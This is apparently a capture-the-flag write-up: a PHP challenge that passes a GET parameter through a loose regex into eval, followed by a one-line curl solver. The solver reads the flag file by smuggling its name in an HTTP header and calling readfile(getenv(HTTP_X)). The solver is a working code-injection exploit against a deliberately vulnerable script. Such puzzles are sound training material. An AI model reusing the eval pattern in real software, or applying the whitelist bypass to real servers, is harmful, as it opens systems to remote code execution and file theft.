## Code
```php
<?php

function get_lucky_word() {
    $words = array("Chuc mung nam moi", "gongxifacai", "happy new year!", "bonne année", "Akemashite omedeto gozaimasu", "Seh heh bok mahn ee bahd euh sae yo", "kimochi", "Feliz Año Nuevo", "S novim godom", "Gelukkig Nieuwjaar", "selamat tahun baru", "iniya puthandu nal Vazhthukkal");
    return $words[array_rand($words)];
}

function get_lucky_number() {
    $numb = rand(0,100);
    return strval($numb);
}


if(!isset($_GET["roll"])) {
    show_source(__FILE__);
}
else
{
    $wl = preg_match('/^[a-z\(\)\_\.]+$/i', $_GET["roll"]);

    if($wl === 0 || strlen($_GET["roll"]) > 50) {
        die("bumbadum badum");
    }
    eval("echo ".$_GET["roll"]."();");
}

?>
```

## Solver
`curl -H 'X: fl4g_here_but_can_you_get_it_hohoho.php' 'http://139.180.155.171:8003/?roll=readfile(getenv(HTTP_X))'`
